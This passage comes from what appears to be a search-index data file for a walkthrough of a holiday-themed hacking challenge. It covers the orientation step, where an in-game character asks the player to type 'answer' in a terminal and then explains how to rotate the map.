teams are Monmouth University, Louisville, and Syracuse.</p> <p>I'm a Queens Girl living my best life at the beautiful Jersey Shore.</p> <p>I'm a proud Mom of three and Grandma of one (so far!! \ud83d\ude4f).</p> <p>Hey, think you can give this terminal a try? {=Just click on it and follow the instructions.=}</p> <p>The terminal tells us to type \"answer\" in the upper pane of the terminal, and when we do we complete the challenge.</p> <p>Answer</p> <p>Enter \"answer\" in the terminal as described.</p>"},{"location":"prologue/holiday_hack_orientation/#solution","title":"Solution","text":""},{"location":"prologue/holiday_hack_orientation/#response","title":"Response","text":"<p>Lynn Schifano</p> <p>Great work! Please, hop off the train and explore the neighborhood.</p> <p>We're so glad to have you here!</p> <p>Oh, one more thing! You can press Q and E to rotate the map around. It gives you a nice semi-3D view of the area - really helps when you need to look around buildings and objects. Pretty neat, right? Give it a spin!</p>"}]}